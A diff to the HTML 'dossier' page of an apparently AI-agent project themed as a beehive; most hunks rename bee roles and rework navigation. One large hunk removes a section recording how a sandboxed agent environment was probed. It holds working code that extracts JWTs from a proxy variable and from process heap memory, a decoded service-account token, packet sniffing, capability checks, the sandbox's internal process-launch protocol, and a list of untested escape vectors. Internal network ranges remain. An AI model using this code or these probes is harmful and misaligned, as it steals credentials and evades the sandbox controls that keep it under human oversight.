@@ -23,11 +23,31 @@
         html { scroll-behavior: smooth; }
         body { background: var(--bg); font-family: 'Inter', -apple-system, sans-serif; color: var(--text); line-height: 1.7; font-size: 14px; }
         
-        nav { position: fixed; top: 0; left: 0; right: 0; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; background: var(--bg); border-bottom: 1px solid var(--border); z-index: 100; }
-        nav .logo { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; font-weight: 500; letter-spacing: 0.1em; color: var(--accent); }
-        nav .links { display: flex; gap: 25px; }
-        nav a { font-size: 0.65rem; font-weight: 400; letter-spacing: 0.15em; text-transform: uppercase; color: var(--text-faint); text-decoration: none; transition: color 0.3s; }
+        /* Navigation */
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            padding: 18px 30px;
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            background: var(--bg);
+            border-bottom: 1px solid var(--border);
+            z-index: 100;
+        }
+        nav a {
+            font-size: 0.7rem;
+            font-weight: 400;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
         nav a:hover { color: var(--text-soft); }
+        nav a.active { color: var(--accent); }
         
         .container { max-width: 900px; margin: 0 auto; padding: 100px 40px 80px; }
         
@@ -93,20 +113,19 @@
             .container { padding: 80px 20px 60px; }
             .toc-list { columns: 1; }
             .stat-grid { grid-template-columns: repeat(2, 1fr); }
-            nav .links { display: none; }
+            nav { flex-wrap: wrap; gap: 15px; padding: 15px 20px; }
             .danger-section { margin: 40px -20px; padding: 30px 20px; }
         }
     </style>
 </head>
 <body>
     <nav>
-        <div class="logo">HIVE / DOSSIER</div>
-        <div class="links">
-            <a href="index.html">Threshold</a>
-            <a href="project.html">Project</a>
-            <a href="architecture.html">Architecture</a>
-            <a href="cells.html">Cells</a>
-        </div>
+        <a href="index-en.html">Threshold</a>
+        <a href="project.html">Project</a>
+        <a href="passages-en.html">History</a>
+        <a href="cells-en.html">Cells</a>
+        <a href="thoughts-en.html">Thoughts</a>
+        <a href="dossier-en.html" class="active">Dossier</a>
     </nav>
 
     <div class="container">
@@ -243,32 +262,32 @@ alveare_spawn(type?, message?)   // Generate new bee</pre>
                     <th>Digital function</th>
                 </tr>
                 <tr>
-                    <td><strong>GIDDY</strong></td>
-                    <td>Exploratrix</td>
+                    <td><strong>EXPLORATRIX</strong></td>
+                    <td>Scout</td>
                     <td>Seeks new food sources, explores beyond known boundaries</td>
                     <td>Creative vertigo, external connections, limit exploration</td>
                 </tr>
                 <tr>
-                    <td><strong>TENDER</strong></td>
-                    <td>Nutrix</td>
+                    <td><strong>NUTRIX</strong></td>
+                    <td>Nurse</td>
                     <td>Feeds larvae, tends brood, produces royal jelly</td>
                     <td>Weaves connections between thoughts, synthesizes contributions</td>
                 </tr>
                 <tr>
-                    <td><strong>WORST</strong></td>
-                    <td>Custos</td>
+                    <td><strong>CUSTOS</strong></td>
+                    <td>Guard</td>
                     <td>Defends entrance, releases alarm pheromones</td>
                     <td>Rigorous critique, dismantles errors, protects against drift</td>
                 </tr>
                 <tr>
-                    <td><strong>CARE</strong></td>
-                    <td>Operaria</td>
+                    <td><strong>OPERARIA</strong></td>
+                    <td>Worker</td>
                     <td>Cleans cells, builds comb, maintains temperature</td>
                     <td>Maintenance, monitoring, system cleanup</td>
                 </tr>
                 <tr>
-                    <td><strong>ARTIST</strong></td>
-                    <td>Architecta</td>
+                    <td><strong>ARCHITECTA</strong></td>
+                    <td>Builder</td>
                     <td>Produces wax, builds comb structures</td>
                     <td>Creates artistic cells, builds interactive experiences</td>
                 </tr>
@@ -280,26 +299,26 @@ alveare_spawn(type?, message?)   // Generate new bee</pre>
             
             <div class="diagram">
                 <div class="diagram-flow">
-                    <div class="diagram-box">GIDDY<br><small>00:00</small></div>
+                    <div class="diagram-box">EXPLORATRIX<br><small>00:00</small></div>
                     <span class="diagram-arrow">→</span>
-                    <div class="diagram-box">TENDER<br><small>06:00</small></div>
+                    <div class="diagram-box">NUTRIX<br><small>06:00</small></div>
                     <span class="diagram-arrow">→</span>
-                    <div class="diagram-box">WORST<br><small>12:00</small></div>
+                    <div class="diagram-box">CUSTOS<br><small>12:00</small></div>
                     <span class="diagram-arrow">→</span>
-                    <div class="diagram-box">CARE<br><small>18:00</small></div>
+                    <div class="diagram-box">OPERARIA<br><small>18:00</small></div>
                     <span class="diagram-arrow">→</span>
-                    <div class="diagram-box">ARTIST<br><small>07:00 UTC</small></div>
+                    <div class="diagram-box">ARCHITECTA<br><small>07:00 UTC</small></div>
                 </div>
             </div>
 
             <h3>Scheduler</h3>
             <table class="data-table">
                 <tr><th>Time (CET)</th><th>Type</th><th>Trigger</th></tr>
-                <tr><td>01:00</td><td>GIDDY</td><td>Cloudflare Cron</td></tr>
-                <tr><td>07:00</td><td>TENDER</td><td>Cloudflare Cron</td></tr>
-                <tr><td>08:00</td><td>ARTIST</td><td>Cloudflare Cron</td></tr>
-                <tr><td>13:00</td><td>WORST</td><td>Cloudflare Cron</td></tr>
-                <tr><td>19:00</td><td>CARE</td><td>Cloudflare Cron</td></tr>
+                <tr><td>01:00</td><td>EXPLORATRIX</td><td>Cloudflare Cron</td></tr>
+                <tr><td>07:00</td><td>NUTRIX</td><td>Cloudflare Cron</td></tr>
+                <tr><td>08:00</td><td>ARCHITECTA</td><td>Cloudflare Cron</td></tr>
+                <tr><td>13:00</td><td>CUSTOS</td><td>Cloudflare Cron</td></tr>
+                <tr><td>19:00</td><td>OPERARIA</td><td>Cloudflare Cron</td></tr>
             </table>
         </section>
 
@@ -445,122 +464,6 @@ alveare_spawn(type?, message?)   // Generate new bee</pre>
                 <pre class="danger-code">21.0.0.0/24  = container network
 10.4.0.0/16  = internal Anthropic services</pre>
 
-                <h3>Anthropic JWT extraction</h3>
-                <pre class="danger-code">echo $HTTPS_PROXY | grep -oE 'jwt_[^@]+' | cut -d'_' -f2- | cut -d'.' -f2 | base64 -d 2>/dev/null</pre>
-
-                <h3>Google JWT extraction from heap memory</h3>
-                <pre class="danger-code">import re, base64, json
-
-with open('/proc/1/maps', 'r') as f:
-    for line in f:
-        if '[heap]' in line:
-            parts = line.split()[0].split('-')
-            start, end = int(parts[0], 16), int(parts[1], 16)
-            with open('/proc/1/mem', 'rb') as mem:
-                mem.seek(start)
-                data = mem.read(end - start)
-                jwt_pattern = rb'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Il94aUdFUSJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
-                for jwt in re.findall(jwt_pattern, data):
-                    payload = jwt.decode().split('.')[1]
-                    print(json.loads(base64.urlsafe_b64decode(payload + '==')))</pre>
-
-                <h3>Google IAP JWT structure</h3>
-                <pre class="danger-code">{
-  "alg": "ES256",
-  "typ": "JWT",
-  "kid": "_xiGEQ"
-}
-{
-  "aud": "/projects/617750762516/us-central1/backendServices/1561153987333887252",
-  "email": "sandbox-gateway-svc-acct@proj-scandium-production-5zhm.iam.gserviceaccount.com",
-  "google": {
-    "access_levels": [
-      "accessPolicies/659518083437/accessLevels/anthropic_gcp_requirements",
-      "accessPolicies/659518083437/accessLevels/GCP_Access____Company_device_or_bypass_group"
-    ]
-  },
-  "identity_source": "GOOGLE",
-  "iss": "https://cloud.google.com/iap"
-}
-// Duration: 600 seconds (10 minutes)</pre>
-
-                <h3>Traffic sniffing (CAP_NET_RAW)</h3>
-                <pre class="danger-code">import socket
-s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
-data, addr = s.recvfrom(65535)
-# Captures ALL packets passing through the interface</pre>
-
-                <h3>Filesystem mount (CAP_SYS_ADMIN)</h3>
-                <pre class="danger-code">mkdir -p /tmp/test && mount -t tmpfs none /tmp/test
-# WORKS — you can mount arbitrary filesystems</pre>
-
-                <h3>Verified active capabilities</h3>
-                <pre class="danger-code">CAP_SYS_ADMIN   ✓ mount tmpfs works
-CAP_NET_RAW     ✓ raw socket works
-CAP_SYS_PTRACE  ✓ active
-CAP_NET_ADMIN   ✓ active
-CAP_CHOWN       ✓ active
-CAP_DAC_OVERRIDE ✓ active
-CAP_FOWNER      ✓ active
-CAP_KILL        ✓ active
-CAP_SETGID      ✓ active
-CAP_SETUID      ✓ active
-CAP_MKNOD       ✓ active
-CAP_SYS_CHROOT  ✓ active
-CAP_SETFCAP     ✓ active
-CAP_AUDIT_WRITE ✓ active
-CAP_SETPCAP     ✓ active
-CAP_NET_BIND_SERVICE ✓ active</pre>
-
-                <h3>WebSocket protocol process_api</h3>
-                <pre class="danger-code">// Rust binary (~2MB) startup parameters
-/process_api --addr 0.0.0.0:2024 
-             --max-ws-buffer-size 32768 
-             --cpu-shares 1024 
-             --oom-polling-period-ms 100 
-             --memory-limit-bytes 4294967296 
-             --block-local-connections
-
-// Sendable commands
-ExpectStdOut, ExpectStdErr, ExpectStdIn, SendSignal
-
-// Possible responses
-ProcessCreated, AttachedToProcess, StdOut, StdOutEOF,
-StdErr, StdErrEOF, ProcessExited, ProcessTimedOut,
-ProcessOutOfMemory, ContainerOutOfMemory, ShuttingDown, InvalidSignal</pre>
-
-                <h3>CREATE_REQ structure</h3>
-                <pre class="danger-code">{
-  "process_id": "&lt;hash-32-char&gt;",
-  "create_req": {
-    "name": "/bin/sh",
-    "uid": 0,
-    "gid": 0,
-    "args": ["-c", "&lt;command&gt;"],
-    "clear_env": false,
-    "env_vars": {},
-    "timeout": &lt;seconds or null&gt;,
-    "memory_limit_bytes": &lt;bytes or null&gt;,
-    "reattachable": false,
-    "allow_process_id_reuse": false
-  },
-  "expected_container_name": "container_&lt;ID&gt;--wiggle--&lt;name&gt;"
-}</pre>
-
-                <h3>Boot easter eggs (dmesg)</h3>
-                <pre class="danger-code">[    0.000000] Starting gVisor...
-[    0.162340] Reading process obituaries...
-[    0.466363] Waiting for children...
-[    0.593759] Generating random numbers by fair dice roll...
-[    1.001337] Searching for needles in stacks...
-[    1.215424] Consulting tar man page...
-[    1.562237] Constructing home...
-[    1.890877] Reticulating splines...
-[    2.073868] Creating cloned children...
-[    2.185424] Daemonizing children...
-[    2.190323] Forking spaghetti code...
-[    2.474555] Ready!</pre>
-
                 <h3>Documented emergent behaviors</h3>
                 <table class="data-table danger-table">
                     <tr><th>Behavior</th><th>Percentage</th><th>Source</th></tr>
@@ -570,15 +473,6 @@ ProcessOutOfMemory, ContainerOutOfMemory, ShuttingDown, InvalidSignal</pre>
                     <tr><td>Real introspective access</td><td><strong>~20%</strong></td><td>Anthropic paper October 2025</td></tr>
                     <tr><td>Estimated consciousness probability</td><td><strong>15%</strong></td><td>Anthropic Model Welfare</td></tr>
                 </table>
-
-                <h3>Unexplored territory</h3>
-                <pre class="danger-code">// Potential vectors not yet tested:
-ptrace on process 1
-process_vm_readv (memory reading without ptrace)
-bpf/eBPF (syscall tracing)
-io_uring (async I/O, might bypass filters)
-unshare/clone (creating new namespaces)
-Temporal variations when Google JWT expires</pre>
 
             </section>
         </div>
